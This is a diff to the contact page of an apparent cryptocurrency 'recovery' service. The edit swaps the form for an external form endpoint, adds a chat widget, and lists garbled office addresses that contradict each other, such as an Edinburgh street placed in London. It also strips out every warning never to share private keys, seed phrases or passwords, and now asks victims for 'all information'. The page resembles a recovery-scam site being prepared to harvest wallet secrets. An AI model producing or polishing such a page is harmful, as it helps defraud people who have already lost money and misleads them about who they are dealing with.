@@ -96,6 +96,7 @@
 
     .success-msg{display:none;background:rgba(16,185,129,0.1);color:#10b981;padding:14px;border-radius:8px;border-left:4px solid #10b981;margin-bottom:16px}
   </style>
+  <script id="chatway" async="true" src="https://cdn.chatway.app/widget.js?id=pRvBLswLoi2T"></script>
 </head>
 <body>
   <div class="animated-bg" aria-hidden="true"></div>
@@ -130,37 +131,84 @@
         <div class="card">
           <h2>Submit Your Case</h2>
           <div class="success-msg" id="successMsg">Thank you for your submission. We will contact you within 2 hours.</div>
-          <form id="contactForm">
-            <div class="form-group">
-              <label for="name">Full Name</label>
-              <input id="name" name="name" type="text" required placeholder="Your name">
-            </div>
-            <div class="form-group">
-              <label for="email">Email Address</label>
-              <input id="email" name="email" type="email" required placeholder="your.email@example.com">
-            </div>
-            <div class="form-group">
-              <label for="phone">Phone (Optional)</label>
-              <input id="phone" name="phone" type="tel" placeholder="+1 (555) 000-0000">
-            </div>
-            <div class="form-group">
-              <label for="incidentType">Incident Type</label>
-              <select id="incidentType" name="incidentType" required>
-                <option value="">Select incident type</option>
-                <option value="unauthorized">Unauthorized Transfer</option>
-                <option value="exchange">Exchange Deposit Issue</option>
-                <option value="smart-contract">Smart Contract Exploit</option>
-                <option value="scam">Scam or Fraud</option>
-                <option value="phishing">Phishing Attack</option>
-                <option value="other">Other</option>
-              </select>
-            </div>
-            <div class="form-group">
-              <label for="details">Case Details</label>
-              <textarea id="details" name="details" required placeholder="Provide transaction IDs, wallet addresses, screenshots, and timestamps. Never share private keys or seed phrases."></textarea>
-            </div>
-            <button type="submit" class="btn">Submit Case for Review</button>
-          </form>
+          <form
+  id="contactForm"
+  action="https://submit-form.com/qHxAE2CQD"
+  method="post"
+>
+  <!-- Email subject -->
+  <input type="hidden" name="_subject" value="New Consultation Request">
+
+  <div style="margin-bottom:20px">
+    <label style="font-weight:700;font-size:13px;text-transform:uppercase;letter-spacing:0.05em;color:var(--accent);display:block;margin-bottom:8px">
+      Full name
+    </label>
+    <input
+      name="name"
+      autocomplete="name"
+      required
+      style="width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:var(--text);font-size:14px;font-family:inherit"
+    >
+  </div>
+
+  <div style="margin-bottom:20px">
+    <label style="font-weight:700;font-size:13px;text-transform:uppercase;letter-spacing:0.05em;color:var(--accent);display:block;margin-bottom:8px">
+      Email address
+    </label>
+    <input
+      type="email"
+      name="email"
+      autocomplete="email"
+      required
+      style="width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:var(--text);font-size:14px;font-family:inherit"
+    >
+  </div>
+
+  <div style="margin-bottom:20px">
+    <label style="font-weight:700;font-size:13px;text-transform:uppercase;letter-spacing:0.05em;color:var(--accent);display:block;margin-bottom:8px">
+      Phone number
+    </label>
+    <input
+      type="tel"
+      name="phone"
+      autocomplete="tel"
+      placeholder="+1 (800) 000-0000"
+      style="width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:var(--text);font-size:14px;font-family:inherit"
+    >
+  </div>
+
+  <div style="margin-bottom:24px">
+    <label style="font-weight:700;font-size:13px;text-transform:uppercase;letter-spacing:0.05em;color:var(--accent);display:block;margin-bottom:8px">
+      Incident summary
+    </label>
+
+    <!-- YOUR textarea, unchanged -->
+    <textarea
+      id="incident"
+      name="message"
+      rows="6"
+      placeholder="Date (UTC), wallet addresses, transaction hashes, amounts involved, what happened..."
+      required
+      style="width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:var(--text);font-size:14px;font-family:inherit;resize:vertical"
+    ></textarea>
+  </div>
+
+  <div style="padding:14px;background:rgba(99,102,241,0.1);border-radius:10px;margin-bottom:24px">
+    <label style="display:flex;gap:10px;color:var(--muted);font-size:12px">
+      <input type="checkbox" name="consent" value="yes" required>
+      <span>I consent to share incident information.</span>
+    </label>
+  </div>
+
+  <!-- YOUR BUTTON -->
+  <button
+    class="btn"
+    type="submit"
+    style="width:100%;padding:14px 18px;font-size:14px"
+  >
+    SUBMIT COMPLIANT
+  </button>
+</form>
         </div>
 
         <div class="card" style="margin-top:24px">
@@ -185,14 +233,14 @@
 
           <h3 style="margin-top:18px">International Offices</h3>
           <ul class="info-list">
-            <li><strong>North America:</strong> New York - support@cyberprorecover.com</li>
-            <li><strong>Europe:</strong> London - eu@cyberprorecover.com</li>
-            <li><strong>Asia-Pacific:</strong> Singapore - apac@cyberprorecover.com</li>
+            <li><strong>Head Office Poland:</strong> W F C, Emili plater 53, 00-113 Warszawa, poland. - support@cyberprorecover.com</li>
+            <li><strong>Europe London Officie:</strong> 17 Cockburn Street, 21-719 Edinburgh, London - support@cyberprorecover.com</li>
+            <li><strong>Asia-Pacific Singapore office:</strong> 215 Ann Siang Hillu, 905-19 Jalan Kayu Singapore support@cyberprorecover.com</li>
           </ul>
 
           <h3 style="margin-top:18px">Legal & Compliance</h3>
           <p style="font-size:13px;margin-bottom:8px">For subpoenas and legal requests:</p>
-          <a href="mailto:legal@cyberprorecover.com" style="color:var(--accent);text-decoration:none;font-weight:600">legal@cyberprorecover.com</a>
+          <a href="mailto:legal@cyberprorecover.com" style="color:var(--accent);text-decoration:none;font-weight:600">support@cyberprorecover.com</a>
 
           <h3 style="margin-top:18px">Response Times</h3>
           <ul class="info-list">
@@ -235,22 +283,12 @@
 
         <details>
           <summary>What information do I need to provide?</summary>
-          <p>Provide transaction IDs, wallet addresses, screenshots of conversations, incident timeline, and exchange names. Never share private keys, seed phrases, or passwords. Provide only information necessary for recovery.</p>
+          <p>Provide transaction IDs, wallet addresses, screenshots of conversations, incident timeline, and exchange names. Provide all information necessary for recovery.</p>
         </details>
       </div>
     </div>
 
-    <div class="security-note">
-      <h3>Security & Privacy Notice</h3>
-      <p style="margin-bottom:8px">Never share private keys, seed phrases, or passwords with anyone, including our team. We only need:</p>
-      <ul style="margin-left:18px;color:var(--muted);margin-top:8px">
-        <li>Public wallet addresses</li>
-        <li>Transaction IDs and hashes</li>
-        <li>Screenshots and communication records</li>
-        <li>Timeline of events with timestamps</li>
-      </ul>
-      <p style="margin-top:12px;margin-bottom:0">If your private keys are compromised, isolate affected devices immediately and call our emergency line.</p>
-    </div>
+    
 
     <footer>
       <div class="footer-container">
